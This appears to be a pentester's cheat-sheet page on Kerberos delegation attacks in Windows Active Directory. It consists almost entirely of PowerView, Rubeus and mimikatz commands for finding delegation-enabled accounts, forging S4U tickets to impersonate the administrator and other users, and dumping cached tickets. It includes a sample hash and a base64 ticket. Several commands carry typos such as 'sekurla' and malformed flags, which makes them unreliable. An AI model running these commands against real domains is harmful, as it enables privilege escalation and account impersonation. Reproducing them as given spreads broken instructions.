---
title: Delegation attacks
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/delegation-attacks
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---
## Constrained delegation

If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it's possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.

### Enumerate constrained delegation

```
Get-DomainUser -TrustedToAuth

Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
```

### Exploit with Rubeus

```
.\Rubeus.exe hash /password:<password>
```

```
.\Rubeus.exe asktgt /user:<user> /domain<domain> /aes256<AES hash>
```

```
.\Rubeus.exe s4u /ticket:<ticket> /impersonateuser<admininistrator> /sdssnpn:<spn_constrained> /altservice:HTTP /ptt
```

Example:

```
.\Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:administrator /msdsspn:"cifs/domain.com" /altservice:cifs,host /ptt
```

Example with base64 ticket:

```
# Save TGS to file
Rubeus.exe s4u /ticket:+lhggPlMIID4aADAgEFoQsbCU0zQy5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTTNDLkxPQ0FMo4IDqzCCA6egAwIBEqEDAgEEooIDmQSCA5XpEbxe5LARdWtJ362bAz7urCoUN79UNz23AfuY1LhR+T+bG06uGgSzKSXWUYZ3txMtkG3RpMnnA9zPhE8sLNNr29rMuH2NuJAF0flo/k/FZltiTTXMgvkHRPXvSdXlxAWxRm3+UXUpkccKXy7xbnvf3Y9Faalkb+Z6aLplOpU1Ef8/ZKMPwae+G5ua4hClYLYD+EaaxcDmvTwwtdxNYkCHbK4ix5XEik7IzctjoBoFlPoaryVoKvBPs4s3WluM0ZUjurT51/dqSo3AjkjSP5UTzsyIzz6RsqOSfGuR4D5WjTozz8ul2pLmexMVqU7vYZrg/VjoANNIOFrpAMXKX2ZCJp8IDVL8T+3k1cb3J5utKXcye3eH9odnUHZoXuker3KGl9A9f87p+quJwl8rXphOd5rG1G6wY5D+gYBjvTVRPio+z69FRcYKgZkSQBk3vzHpiB49wnwyktBBv/R2NzgwA2zCXqHqz5RgdnhZfkDSvR5/XET42DDfShvOkIq+YOFAlgZWuFrBw0TBoqfM4qazqYcSrH8nqVnQeKbPyLQHJO0gg6h1+71aoDaNfOSHUqtOTQtIeCbmq3OBm11JsJxfmpoozfZ1fqLiJ/Rz/iJBLLa3RKCERwiMGlLSdBk7ZBJjPmdrKhJ4jrldMP7XdeDuNMIXi9bnz7OfsyBvlf0Ve9fb3LaIrbsaCXnV7AjP6DB4MygIdMIwFJ5uo45KerdoY9ArYHrTeVwElg+87YgU0Okfdicsg4Zl8a3v1E2gSGQdz22zoEKWas4NW01mBTYdqFU0NG/GPUh/GhwC1sF76EomxbJL0MdDBLA0DJ3Ox50Wclvw70+VIa9uQyb56EZQcL8rmugA8+gAtii1TRPl4ILk86lMt+7qTPulUh1g23J32bh2KFzfEyhbt6Uj7ry5CufdhkeaLSncfuQjcSA1B3HD3lYGljZxZ+XrcF2Y7d3/2zlBY3VEDTmXre02ef8tq9kwVa220NT7EIXGOfOntcrMBaAyzZG6SMKI+AAo1PuPx/6ifo6TZ8tlGxWHlBly+UvNnittH41RW3Ipz8xwd26J1qpV2zN5JRu1gAcuEtUGNTKaJ65Z9jstrqxGtyTV7/e3aYm+ghfaQCh1wONp2HpB7DHtjoQIJOE9gidSkr1n36OuVsUdP9uBi9lA/Z7GdkckPoSaVvpdAgqczQrVfjKskdPjixJ6A2Dp/AnaleI2cetnuaOB3DCB2aADAgEAooHRBIHOfYHLMIHIoIHFMIHCMIG/oCswKaADAgESoSIEIGTh+kKtVOKoRgEb76oda8NoIKz5haFB6CNC6DJH54FOoQsbCU0zQy5MT0NBTKIUMBKgAwIBAaELMAkbB00zU1FMVySjBwMFAGChAAClERgPMjAyMzEwMjcxMjM2NTlaphEYDzIwMjMxMDI3MjIxODU4WqcRGA8yMDIzMTEwMzAyMzQxNVqoCxsJTTNDLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlNM0MuTE9DQUw= /impersonateuser:Micheal.Crosley /domain:m3c.local /msdsspn:"time/m3webaw" /altservice:http /outfile:TGS_micheal_TIMER
```

After saving the ticket you can load it manually in memory with:

```
Rubeus.exe ptt /ticket:path_to_ticket
```

## Unconstrained delegation

### Get unconstrained delegation machines

* BloodHound will list this too

```
Get-NetComputer -Unconstrained
```

### Get tickets

```
.\mimikatz.exe "sekurla::tickets /export" exit
.\Rubeus.exe dump /service:krbtgt /nowrap
```
